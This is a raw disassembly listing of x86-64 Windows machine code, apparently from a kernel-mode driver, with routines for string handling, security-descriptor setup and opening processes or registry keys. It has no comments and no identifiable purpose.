   1400048a8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400048ad:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400048b2:	55                   	push   %rbp
   1400048b3:	57                   	push   %rdi
   1400048b4:	41 56                	push   %r14
   1400048b6:	48 8d ac 24 b0 fe ff 	lea    -0x150(%rsp),%rbp
   1400048bd:	ff 
   1400048be:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   1400048c5:	48 8b 05 e4 6e 00 00 	mov    0x6ee4(%rip),%rax        # 0x14000b7b0
   1400048cc:	48 33 c4             	xor    %rsp,%rax
   1400048cf:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   1400048d6:	48 8b f2             	mov    %rdx,%rsi
   1400048d9:	4c 8b f1             	mov    %rcx,%r14
   1400048dc:	bb 00 02 00 00       	mov    $0x200,%ebx
   1400048e1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400048e6:	44 8b c3             	mov    %ebx,%r8d
   1400048e9:	33 d2                	xor    %edx,%edx
   1400048eb:	e8 90 2b 00 00       	call   0x140007480
   1400048f0:	33 c0                	xor    %eax,%eax
   1400048f2:	33 ff                	xor    %edi,%edi
   1400048f4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400048f7:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400048fc:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004901:	40 38 3e             	cmp    %dil,(%rsi)
   140004904:	0f 84 6c 01 00 00    	je     0x140004a76
   14000490a:	48 39 3d ef af 00 00 	cmp    %rdi,0xafef(%rip)        # 0x14000f900
   140004911:	0f 84 5f 01 00 00    	je     0x140004a76
   140004917:	40 38 3d e2 ad 00 00 	cmp    %dil,0xade2(%rip)        # 0x14000f700
   14000491e:	0f 84 52 01 00 00    	je     0x140004a76
   140004924:	44 8b c3             	mov    %ebx,%r8d
   140004927:	48 8d 15 d2 ad 00 00 	lea    0xadd2(%rip),%rdx        # 0x14000f700
   14000492e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004933:	e8 fe 26 00 00       	call   0x140007036
   140004938:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000493d:	e8 e8 26 00 00       	call   0x14000702a
   140004942:	44 8b c3             	mov    %ebx,%r8d
   140004945:	48 8d 15 44 2d 00 00 	lea    0x2d44(%rip),%rdx        # 0x140007690
   14000494c:	4c 2b c0             	sub    %rax,%r8
   14000494f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004954:	e8 01 27 00 00       	call   0x14000705a
   140004959:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000495e:	e8 c7 26 00 00       	call   0x14000702a
   140004963:	48 8b 15 26 6e 00 00 	mov    0x6e26(%rip),%rdx        # 0x14000b790
   14000496a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000496f:	44 8b c3             	mov    %ebx,%r8d
   140004972:	4c 2b c0             	sub    %rax,%r8
   140004975:	e8 e0 26 00 00       	call   0x14000705a
   14000497a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000497f:	e8 a6 26 00 00       	call   0x14000702a
   140004984:	44 8b c3             	mov    %ebx,%r8d
   140004987:	48 8d 15 12 2d 00 00 	lea    0x2d12(%rip),%rdx        # 0x1400076a0
   14000498e:	4c 2b c0             	sub    %rax,%r8
   140004991:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004996:	e8 bf 26 00 00       	call   0x14000705a
   14000499b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400049a0:	e8 85 26 00 00       	call   0x14000702a
   1400049a5:	48 2b d8             	sub    %rax,%rbx
   1400049a8:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400049ad:	4c 8b c3             	mov    %rbx,%r8
   1400049b0:	48 8b d6             	mov    %rsi,%rdx
   1400049b3:	e8 a2 26 00 00       	call   0x14000705a
   1400049b8:	ba 00 08 00 00       	mov    $0x800,%edx
   1400049bd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400049c2:	e8 b1 24 00 00       	call   0x140006e78
   1400049c7:	84 c0                	test   %al,%al
   1400049c9:	0f 84 a7 00 00 00    	je     0x140004a76
   1400049cf:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400049d4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400049d9:	e8 aa 15 00 00       	call   0x140005f88
   1400049de:	84 c0                	test   %al,%al
   1400049e0:	0f 84 90 00 00 00    	je     0x140004a76
   1400049e6:	8d 4f 03             	lea    0x3(%rdi),%ecx
   1400049e9:	e8 f6 d0 ff ff       	call   0x140001ae4
   1400049ee:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400049f3:	48 8b f0             	mov    %rax,%rsi
   1400049f6:	e8 1d 25 00 00       	call   0x140006f18
   1400049fb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a00:	48 8b d8             	mov    %rax,%rbx
   140004a03:	e8 10 24 00 00       	call   0x140006e18
   140004a08:	48 83 fb 1e          	cmp    $0x1e,%rbx
   140004a0c:	76 68                	jbe    0x140004a76
   140004a0e:	44 8d 47 1e          	lea    0x1e(%rdi),%r8d
   140004a12:	48 8b d6             	mov    %rsi,%rdx
   140004a15:	48 8b c8             	mov    %rax,%rcx
   140004a18:	e8 ff 09 00 00       	call   0x14000541c
   140004a1d:	48 85 c0             	test   %rax,%rax
   140004a20:	74 54                	je     0x140004a76
   140004a22:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a27:	e8 ec 24 00 00       	call   0x140006f18
   140004a2c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a31:	48 8b d8             	mov    %rax,%rbx
   140004a34:	e8 df 23 00 00       	call   0x140006e18
   140004a39:	48 8b c8             	mov    %rax,%rcx
   140004a3c:	48 8b d3             	mov    %rbx,%rdx
   140004a3f:	e8 00 15 00 00       	call   0x140005f44
   140004a44:	48 8b d8             	mov    %rax,%rbx
   140004a47:	48 85 c0             	test   %rax,%rax
   140004a4a:	74 2a                	je     0x140004a76
   140004a4c:	48 8d 15 5d 2c 00 00 	lea    0x2c5d(%rip),%rdx        # 0x1400076b0
   140004a53:	48 8b c8             	mov    %rax,%rcx
   140004a56:	e8 05 26 00 00       	call   0x140007060
   140004a5b:	48 85 c0             	test   %rax,%rax
   140004a5e:	74 13                	je     0x140004a73
   140004a60:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140004a66:	48 8b d3             	mov    %rbx,%rdx
   140004a69:	49 8b ce             	mov    %r14,%rcx
   140004a6c:	e8 c5 25 00 00       	call   0x140007036
   140004a71:	eb 03                	jmp    0x140004a76
   140004a73:	40 b7 01             	mov    $0x1,%dil
   140004a76:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004a7b:	e8 c8 23 00 00       	call   0x140006e48
   140004a80:	40 8a c7             	mov    %dil,%al
   140004a83:	48 8b 8d 40 01 00 00 	mov    0x140(%rbp),%rcx
   140004a8a:	48 33 cc             	xor    %rsp,%rcx
   140004a8d:	e8 1e 26 00 00       	call   0x1400070b0
   140004a92:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   140004a99:	00 
   140004a9a:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140004a9e:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140004aa2:	49 8b e3             	mov    %r11,%rsp
   140004aa5:	41 5e                	pop    %r14
   140004aa7:	5f                   	pop    %rdi
   140004aa8:	5d                   	pop    %rbp
   140004aa9:	c3                   	ret
   140004aaa:	cc                   	int3
   140004aab:	cc                   	int3
   140004aac:	48 83 ec 38          	sub    $0x38,%rsp
   140004ab0:	80 3d 29 96 00 00 00 	cmpb   $0x0,0x9629(%rip)        # 0x14000e0e0
   140004ab7:	74 3b                	je     0x140004af4
   140004ab9:	e8 86 f2 ff ff       	call   0x140003d44
   140004abe:	84 c0                	test   %al,%al
   140004ac0:	75 2e                	jne    0x140004af0
   140004ac2:	8b 05 08 92 00 00    	mov    0x9208(%rip),%eax        # 0x14000dcd0
   140004ac8:	48 8d 15 b1 2b 00 00 	lea    0x2bb1(%rip),%rdx        # 0x140007680
   140004acf:	4c 8b 0d f2 91 00 00 	mov    0x91f2(%rip),%r9        # 0x14000dcc8
   140004ad6:	48 8d 0d 03 98 00 00 	lea    0x9803(%rip),%rcx        # 0x14000e2e0
   140004add:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004ae3:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004ae7:	e8 a4 08 00 00       	call   0x140005390
   140004aec:	85 c0                	test   %eax,%eax
   140004aee:	74 04                	je     0x140004af4
   140004af0:	b0 01                	mov    $0x1,%al
   140004af2:	eb 02                	jmp    0x140004af6
   140004af4:	32 c0                	xor    %al,%al
   140004af6:	48 83 c4 38          	add    $0x38,%rsp
   140004afa:	c3                   	ret
   140004afb:	cc                   	int3
   140004afc:	40 53                	rex push %rbx
   140004afe:	48 83 ec 30          	sub    $0x30,%rsp
   140004b02:	48 8b da             	mov    %rdx,%rbx
   140004b05:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004b08:	48 8b d1             	mov    %rcx,%rdx
   140004b0b:	41 b0 01             	mov    $0x1,%r8b
   140004b0e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004b13:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004b18:	ff 15 d2 36 00 00    	call   *0x36d2(%rip)        # 0x1400081f0
   140004b1e:	85 c0                	test   %eax,%eax
   140004b20:	78 1d                	js     0x140004b3f
   140004b22:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140004b27:	48 85 d2             	test   %rdx,%rdx
   140004b2a:	74 13                	je     0x140004b3f
   140004b2c:	48 8b cb             	mov    %rbx,%rcx
   140004b2f:	e8 32 25 00 00       	call   0x140007066
   140004b34:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004b39:	ff 15 b9 36 00 00    	call   *0x36b9(%rip)        # 0x1400081f8
   140004b3f:	48 83 c4 30          	add    $0x30,%rsp
   140004b43:	5b                   	pop    %rbx
   140004b44:	c3                   	ret
   140004b45:	cc                   	int3
   140004b46:	cc                   	int3
   140004b47:	cc                   	int3
   140004b48:	48 83 ec 48          	sub    $0x48,%rsp
   140004b4c:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140004b52:	45 33 c9             	xor    %r9d,%r9d
   140004b55:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140004b5a:	45 33 c0             	xor    %r8d,%r8d
   140004b5d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004b63:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   140004b68:	ff 15 ba 36 00 00    	call   *0x36ba(%rip)        # 0x140008228
   140004b6e:	85 c0                	test   %eax,%eax
   140004b70:	0f 99 c0             	setns  %al
   140004b73:	48 83 c4 48          	add    $0x48,%rsp
   140004b77:	c3                   	ret
   140004b78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b7d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140004b82:	33 ff                	xor    %edi,%edi
   140004b84:	4d 8b d8             	mov    %r8,%r11
   140004b87:	44 8b d2             	mov    %edx,%r10d
   140004b8a:	4c 8b c9             	mov    %rcx,%r9
   140004b8d:	48 85 c9             	test   %rcx,%rcx
   140004b90:	74 55                	je     0x140004be7
   140004b92:	4d 85 c0             	test   %r8,%r8
   140004b95:	74 50                	je     0x140004be7
   140004b97:	66 41 39 38          	cmp    %di,(%r8)
   140004b9b:	74 4a                	je     0x140004be7
   140004b9d:	85 d2                	test   %edx,%edx
   140004b9f:	7e 46                	jle    0x140004be7
   140004ba1:	4c 8b c1             	mov    %rcx,%r8
   140004ba4:	4d 2b c3             	sub    %r11,%r8
   140004ba7:	66 41 39 39          	cmp    %di,(%r9)
   140004bab:	74 3a                	je     0x140004be7
   140004bad:	49 8b d3             	mov    %r11,%rdx
   140004bb0:	41 8b da             	mov    %r10d,%ebx
   140004bb3:	0f b7 02             	movzwl (%rdx),%eax
   140004bb6:	66 85 c0             	test   %ax,%ax
   140004bb9:	74 39                	je     0x140004bf4
   140004bbb:	66 41 39 04 10       	cmp    %ax,(%r8,%rdx,1)
   140004bc0:	75 10                	jne    0x140004bd2
   140004bc2:	48 83 c2 02          	add    $0x2,%rdx
   140004bc6:	83 eb 01             	sub    $0x1,%ebx
   140004bc9:	78 1c                	js     0x140004be7
   140004bcb:	66 41 39 3c 10       	cmp    %di,(%r8,%rdx,1)
   140004bd0:	75 e1                	jne    0x140004bb3
   140004bd2:	66 39 3a             	cmp    %di,(%rdx)
   140004bd5:	74 1d                	je     0x140004bf4
   140004bd7:	49 83 c1 02          	add    $0x2,%r9
   140004bdb:	49 83 c0 02          	add    $0x2,%r8
   140004bdf:	41 ff ca             	dec    %r10d
   140004be2:	45 85 d2             	test   %r10d,%r10d
   140004be5:	7f c0                	jg     0x140004ba7
   140004be7:	33 c0                	xor    %eax,%eax
   140004be9:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140004bee:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   140004bf3:	c3                   	ret
   140004bf4:	49 8b c1             	mov    %r9,%rax
   140004bf7:	eb f0                	jmp    0x140004be9
   140004bf9:	cc                   	int3
   140004bfa:	cc                   	int3
   140004bfb:	cc                   	int3
   140004bfc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c01:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004c06:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004c0b:	57                   	push   %rdi
   140004c0c:	48 83 ec 20          	sub    $0x20,%rsp
   140004c10:	41 8b e8             	mov    %r8d,%ebp
   140004c13:	48 8b fa             	mov    %rdx,%rdi
   140004c16:	48 8b f1             	mov    %rcx,%rsi
   140004c19:	33 db                	xor    %ebx,%ebx
   140004c1b:	ff 15 57 35 00 00    	call   *0x3557(%rip)        # 0x140008178
   140004c21:	84 c0                	test   %al,%al
   140004c23:	74 45                	je     0x140004c6a
   140004c25:	48 8b cf             	mov    %rdi,%rcx
   140004c28:	ff 15 4a 35 00 00    	call   *0x354a(%rip)        # 0x140008178
   140004c2e:	84 c0                	test   %al,%al
   140004c30:	74 38                	je     0x140004c6a
   140004c32:	48 85 f6             	test   %rsi,%rsi
   140004c35:	74 33                	je     0x140004c6a
   140004c37:	48 85 ff             	test   %rdi,%rdi
   140004c3a:	74 2e                	je     0x140004c6a
   140004c3c:	85 ed                	test   %ebp,%ebp
   140004c3e:	74 2a                	je     0x140004c6a
   140004c40:	38 1f                	cmp    %bl,(%rdi)
   140004c42:	74 26                	je     0x140004c6a
   140004c44:	3b dd                	cmp    %ebp,%ebx
   140004c46:	73 0f                	jae    0x140004c57
   140004c48:	8a 07                	mov    (%rdi),%al
   140004c4a:	48 ff c7             	inc    %rdi
   140004c4d:	88 04 33             	mov    %al,(%rbx,%rsi,1)
   140004c50:	ff c3                	inc    %ebx
   140004c52:	80 3f 00             	cmpb   $0x0,(%rdi)
   140004c55:	75 ed                	jne    0x140004c44
   140004c57:	85 db                	test   %ebx,%ebx
   140004c59:	74 0f                	je     0x140004c6a
   140004c5b:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   140004c5e:	3b d9                	cmp    %ecx,%ebx
   140004c60:	77 04                	ja     0x140004c66
   140004c62:	c6 04 33 00          	movb   $0x0,(%rbx,%rsi,1)
   140004c66:	b0 01                	mov    $0x1,%al
   140004c68:	eb 02                	jmp    0x140004c6c
   140004c6a:	32 c0                	xor    %al,%al
   140004c6c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004c71:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004c76:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004c7b:	48 83 c4 20          	add    $0x20,%rsp
   140004c7f:	5f                   	pop    %rdi
   140004c80:	c3                   	ret
   140004c81:	cc                   	int3
   140004c82:	cc                   	int3
   140004c83:	cc                   	int3
   140004c84:	4c 8b dc             	mov    %rsp,%r11
   140004c87:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140004c8b:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   140004c8f:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140004c93:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140004c97:	41 56                	push   %r14
   140004c99:	48 83 ec 50          	sub    $0x50,%rsp
   140004c9d:	33 c0                	xor    %eax,%eax
   140004c9f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004ca2:	4c 8b f1             	mov    %rcx,%r14
   140004ca5:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140004caa:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004caf:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140004cb3:	48 8b 05 fe 35 00 00 	mov    0x35fe(%rip),%rax        # 0x1400082b8
   140004cba:	84 d2                	test   %dl,%dl
   140004cbc:	74 0c                	je     0x140004cca
   140004cbe:	4c 8b 00             	mov    (%rax),%r8
   140004cc1:	49 8b 88 08 01 00 00 	mov    0x108(%r8),%rcx
   140004cc8:	eb 0a                	jmp    0x140004cd4
   140004cca:	48 8b 08             	mov    (%rax),%rcx
   140004ccd:	48 8b 89 08 01 00 00 	mov    0x108(%rcx),%rcx
   140004cd4:	f6 da                	neg    %dl
   140004cd6:	48 8b e9             	mov    %rcx,%rbp
   140004cd9:	1b f6                	sbb    %esi,%esi
   140004cdb:	81 e6 00 00 02 70    	and    $0x70020000,%esi
   140004ce1:	81 c6 00 00 00 10    	add    $0x10000000,%esi
   140004ce7:	ff 15 73 35 00 00    	call   *0x3573(%rip)        # 0x140008260
   140004ced:	48 8b 0d c4 35 00 00 	mov    0x35c4(%rip),%rcx        # 0x1400082b8
   140004cf4:	8d 58 08             	lea    0x8(%rax),%ebx
   140004cf7:	48 8b 09             	mov    (%rcx),%rcx
   140004cfa:	48 8b 89 10 01 00 00 	mov    0x110(%rcx),%rcx
   140004d01:	ff 15 59 35 00 00    	call   *0x3559(%rip)        # 0x140008260
   140004d07:	48 8b 0d aa 35 00 00 	mov    0x35aa(%rip),%rcx        # 0x1400082b8
   140004d0e:	03 d8                	add    %eax,%ebx
   140004d10:	48 8b 09             	mov    (%rcx),%rcx
   140004d13:	48 8b 89 18 01 00 00 	mov    0x118(%rcx),%rcx
   140004d1a:	ff 15 40 35 00 00    	call   *0x3540(%rip)        # 0x140008260
   140004d20:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004d25:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   140004d2b:	83 c0 18             	add    $0x18,%eax
   140004d2e:	03 d8                	add    %eax,%ebx
   140004d30:	8b d3                	mov    %ebx,%edx
   140004d32:	ff 15 d0 35 00 00    	call   *0x35d0(%rip)        # 0x140008308
   140004d38:	48 8b f8             	mov    %rax,%rdi
   140004d3b:	48 85 c0             	test   %rax,%rax
   140004d3e:	75 0a                	jne    0x140004d4a
   140004d40:	bb 9a 00 00 c0       	mov    $0xc000009a,%ebx
   140004d45:	e9 04 01 00 00       	jmp    0x140004e4e
   140004d4a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004d50:	8b d3                	mov    %ebx,%edx
   140004d52:	48 8b cf             	mov    %rdi,%rcx
   140004d55:	ff 15 15 35 00 00    	call   *0x3515(%rip)        # 0x140008270
   140004d5b:	8b d8                	mov    %eax,%ebx
   140004d5d:	85 c0                	test   %eax,%eax
   140004d5f:	0f 88 db 00 00 00    	js     0x140004e40
   140004d65:	48 8b 05 4c 35 00 00 	mov    0x354c(%rip),%rax        # 0x1400082b8
   140004d6c:	44 8b c6             	mov    %esi,%r8d
   140004d6f:	ba 02 00 00 00       	mov    $0x2,%edx
   140004d74:	48 8b cf             	mov    %rdi,%rcx
   140004d77:	4c 8b 08             	mov    (%rax),%r9
   140004d7a:	4d 8b 89 08 01 00 00 	mov    0x108(%r9),%r9
   140004d81:	ff 15 f1 34 00 00    	call   *0x34f1(%rip)        # 0x140008278
   140004d87:	8b d8                	mov    %eax,%ebx
   140004d89:	85 c0                	test   %eax,%eax
   140004d8b:	0f 88 af 00 00 00    	js     0x140004e40
   140004d91:	48 8b 05 20 35 00 00 	mov    0x3520(%rip),%rax        # 0x1400082b8
   140004d98:	44 8b c6             	mov    %esi,%r8d
   140004d9b:	ba 02 00 00 00       	mov    $0x2,%edx
   140004da0:	48 8b cf             	mov    %rdi,%rcx
   140004da3:	4c 8b 08             	mov    (%rax),%r9
   140004da6:	4d 8b 89 10 01 00 00 	mov    0x110(%r9),%r9
   140004dad:	ff 15 c5 34 00 00    	call   *0x34c5(%rip)        # 0x140008278
   140004db3:	8b d8                	mov    %eax,%ebx
   140004db5:	85 c0                	test   %eax,%eax
   140004db7:	0f 88 83 00 00 00    	js     0x140004e40
   140004dbd:	48 8b 05 f4 34 00 00 	mov    0x34f4(%rip),%rax        # 0x1400082b8
   140004dc4:	44 8b c6             	mov    %esi,%r8d
   140004dc7:	ba 02 00 00 00       	mov    $0x2,%edx
   140004dcc:	48 8b cf             	mov    %rdi,%rcx
   140004dcf:	4c 8b 08             	mov    (%rax),%r9
   140004dd2:	4d 8b 89 18 01 00 00 	mov    0x118(%r9),%r9
   140004dd9:	ff 15 99 34 00 00    	call   *0x3499(%rip)        # 0x140008278
   140004ddf:	8b d8                	mov    %eax,%ebx
   140004de1:	85 c0                	test   %eax,%eax
   140004de3:	78 5b                	js     0x140004e40
   140004de5:	ba 01 00 00 00       	mov    $0x1,%edx
   140004dea:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004def:	ff 15 0b 34 00 00    	call   *0x340b(%rip)        # 0x140008200
   140004df5:	8b d8                	mov    %eax,%ebx
   140004df7:	85 c0                	test   %eax,%eax
   140004df9:	78 45                	js     0x140004e40
   140004dfb:	45 33 c9             	xor    %r9d,%r9d
   140004dfe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004e03:	4c 8b c7             	mov    %rdi,%r8
   140004e06:	b2 01                	mov    $0x1,%dl
   140004e08:	ff 15 fa 33 00 00    	call   *0x33fa(%rip)        # 0x140008208
   140004e0e:	8b d8                	mov    %eax,%ebx
   140004e10:	85 c0                	test   %eax,%eax
   140004e12:	78 2c                	js     0x140004e40
   140004e14:	45 33 c0             	xor    %r8d,%r8d
   140004e17:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004e1c:	48 8b d5             	mov    %rbp,%rdx
   140004e1f:	ff 15 5b 34 00 00    	call   *0x345b(%rip)        # 0x140008280
   140004e25:	8b d8                	mov    %eax,%ebx
   140004e27:	85 c0                	test   %eax,%eax
   140004e29:	78 15                	js     0x140004e40
   140004e2b:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140004e30:	ba 05 00 00 00       	mov    $0x5,%edx
   140004e35:	49 8b ce             	mov    %r14,%rcx
   140004e38:	ff 15 62 34 00 00    	call   *0x3462(%rip)        # 0x1400082a0
   140004e3e:	8b d8                	mov    %eax,%ebx
   140004e40:	ba 51 61 78 58       	mov    $0x58786151,%edx
   140004e45:	48 8b cf             	mov    %rdi,%rcx
   140004e48:	ff 15 f2 34 00 00    	call   *0x34f2(%rip)        # 0x140008340
   140004e4e:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140004e53:	8b c3                	mov    %ebx,%eax
   140004e55:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004e5a:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140004e5f:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140004e64:	48 83 c4 50          	add    $0x50,%rsp
   140004e68:	41 5e                	pop    %r14
   140004e6a:	c3                   	ret
   140004e6b:	cc                   	int3
   140004e6c:	48 ff 25 b5 32 00 00 	rex.W jmp *0x32b5(%rip)        # 0x140008128
   140004e73:	cc                   	int3
   140004e74:	45 33 c0             	xor    %r8d,%r8d
   140004e77:	41 8d 50 01          	lea    0x1(%r8),%edx
   140004e7b:	48 ff 25 9e 34 00 00 	rex.W jmp *0x349e(%rip)        # 0x140008320
   140004e82:	cc                   	int3
   140004e83:	cc                   	int3
   140004e84:	40 53                	rex push %rbx
   140004e86:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140004e8d:	48 8b da             	mov    %rdx,%rbx
   140004e90:	48 8b d1             	mov    %rcx,%rdx
   140004e93:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004e98:	ff 15 aa 34 00 00    	call   *0x34aa(%rip)        # 0x140008348
   140004e9e:	48 83 64 24 58 00    	andq   $0x0,0x58(%rsp)
   140004ea4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140004ea9:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004eae:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004eb3:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   140004eba:	00 
   140004ebb:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140004ec2:	00 
   140004ec3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004ec8:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004ecb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140004ed0:	45 33 c9             	xor    %r9d,%r9d
   140004ed3:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004ed9:	ba 3f 00 0f 00       	mov    $0xf003f,%edx
   140004ede:	48 8b cb             	mov    %rbx,%rcx
   140004ee1:	c7 44 24 68 40 02 00 	movl   $0x240,0x68(%rsp)
   140004ee8:	00 
   140004ee9:	f3 0f 7f 44 24 70    	movdqu %xmm0,0x70(%rsp)
   140004eef:	ff 15 3b 33 00 00    	call   *0x333b(%rip)        # 0x140008230
   140004ef5:	85 c0                	test   %eax,%eax
   140004ef7:	78 15                	js     0x140004f0e
   140004ef9:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   140004f00:	ff c8                	dec    %eax
   140004f02:	83 f8 01             	cmp    $0x1,%eax
   140004f05:	76 07                	jbe    0x140004f0e
   140004f07:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140004f0c:	eb 02                	jmp    0x140004f10
   140004f0e:	33 c0                	xor    %eax,%eax
   140004f10:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140004f17:	5b                   	pop    %rbx
   140004f18:	c3                   	ret
   140004f19:	cc                   	int3
   140004f1a:	cc                   	int3
   140004f1b:	cc                   	int3
   140004f1c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f21:	57                   	push   %rdi
   140004f22:	48 83 ec 30          	sub    $0x30,%rsp
   140004f26:	8b d9                	mov    %ecx,%ebx
   140004f28:	ba 40 00 00 00       	mov    $0x40,%edx
   140004f2d:	33 c9                	xor    %ecx,%ecx
   140004f2f:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   140004f35:	ff 15 cd 33 00 00    	call   *0x33cd(%rip)        # 0x140008308
   140004f3b:	48 8b f8             	mov    %rax,%rdi
   140004f3e:	48 85 c0             	test   %rax,%rax
   140004f41:	74 56                	je     0x140004f99
   140004f43:	48 8b c8             	mov    %rax,%rcx
   140004f46:	ff 15 2c 32 00 00    	call   *0x322c(%rip)        # 0x140008178
   140004f4c:	84 c0                	test   %al,%al
   140004f4e:	74 49                	je     0x140004f99
   140004f50:	33 d2                	xor    %edx,%edx
   140004f52:	48 8b cf             	mov    %rdi,%rcx
   140004f55:	48 69 db f0 d8 ff ff 	imul   $0xffffffffffffd8f0,%rbx,%rbx
   140004f5c:	ff 15 b6 32 00 00    	call   *0x32b6(%rip)        # 0x140008218
   140004f62:	45 33 c9             	xor    %r9d,%r9d
   140004f65:	45 33 c0             	xor    %r8d,%r8d
   140004f68:	48 8b d3             	mov    %rbx,%rdx
   140004f6b:	48 8b cf             	mov    %rdi,%rcx
   140004f6e:	ff 15 ac 32 00 00    	call   *0x32ac(%rip)        # 0x140008220
   140004f74:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004f7a:	45 33 c9             	xor    %r9d,%r9d
   140004f7d:	45 33 c0             	xor    %r8d,%r8d
   140004f80:	33 d2                	xor    %edx,%edx
   140004f82:	48 8b cf             	mov    %rdi,%rcx
   140004f85:	ff 15 85 33 00 00    	call   *0x3385(%rip)        # 0x140008310
   140004f8b:	ba 51 61 78 58       	mov    $0x58786151,%edx
   140004f90:	48 8b cf             	mov    %rdi,%rcx
   140004f93:	ff 15 a7 33 00 00    	call   *0x33a7(%rip)        # 0x140008340
   140004f99:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004f9e:	48 83 c4 30          	add    $0x30,%rsp
   140004fa2:	5f                   	pop    %rdi
   140004fa3:	c3                   	ret
   140004fa4:	40 55                	rex push %rbp
   140004fa6:	53                   	push   %rbx
   140004fa7:	56                   	push   %rsi
   140004fa8:	57                   	push   %rdi
   140004fa9:	41 54                	push   %r12
   140004fab:	41 56                	push   %r14
   140004fad:	41 57                	push   %r15
   140004faf:	48 8b ec             	mov    %rsp,%rbp
   140004fb2:	48 83 ec 50          	sub    $0x50,%rsp
   140004fb6:	45 33 f6             	xor    %r14d,%r14d
   140004fb9:	4c 8d 25 60 aa 00 00 	lea    0xaa60(%rip),%r12        # 0x14000fa20
   140004fc0:	66 44 39 35 58 aa 00 	cmp    %r14w,0xaa58(%rip)        # 0x14000fa20
   140004fc7:	00 
   140004fc8:	0f 57 c0             	xorps  %xmm0,%xmm0
